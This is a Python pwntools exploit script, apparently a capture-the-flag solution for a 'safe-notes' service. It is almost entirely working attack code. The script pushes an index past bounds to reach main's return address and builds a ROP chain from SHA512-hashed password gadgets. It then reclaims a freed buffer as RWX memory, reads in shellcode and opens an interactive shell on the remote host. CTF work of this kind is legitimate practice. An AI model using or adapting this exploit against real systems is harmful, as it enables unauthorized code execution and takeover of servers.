from pwn import *

HOST, PORT = "safe-notes.nc.jctf.pro", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("id: ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def private(pw, note, name):
	go(1)
	ii(pw)
	ii(note)
	ii(name)

def public(note, name):
	ii(2)
	ii(note)
	ii(name)

def load(index):
	go(3)
	ii(index)

# curIndex++
for i in range(19):
	ii(3)
	ii('b')

# now item[curIndex] is pointing return address of main()
for i, c in enumerate([
	# For each password (number), after SHA512, it compiles to...
	126625,  # pop rsi; ret
	0,       # will be freed by private('ey', 'ey', 'yo1'), and reclaimed by followed calls of private
	159250,  # xchg eax, ebx; ret == eax = 0
	42543,   # cdq; ret == edx = 0
	9103859, # dec dl; ret == edx = 0xff
	15531901 # syscall; ret == sys_read(0, mmap(RWX), 0xff)
	]):
	bytes=hashlib.sha512(str(c)).digest()[:4]
	print disasm(bytes, arch="amd64")
	# item[curIndex++] = buf = mmap(RWX); // <-- memcpy(buf, SHA512('password'), 4)
	# item[curIndex++] = buf = mmap(R__); // <-- memcpy(buf, "ey", 2)
	private('%s'%c, 'ey', 'yo%d' % i)

	# item[--curIndex] = 0
	ii(2)
	ii("'")

# Free 1 buffer == rsi at sys_read
private('ey', 'ey', 'yo1')

# Adjust the index so that new buffer pointer will be located right after syscall; ret
for i in range(2):
	ii(2)
	ii("'")

# Reclaim the area (== rsi) with RWX buffer, and place address after rop payload
private('ey', 'ey', 'yo!')

# Raise exception, then main() catches it, and returns
# ... I could just return from child function, because canary is not overwritten...
ii(100)
r.recvuntil('!')

# Send shellcode
context.arch='amd64'
r.send(asm(shellcraft.amd64.sh()))

# Then, shell!
r.interactive()
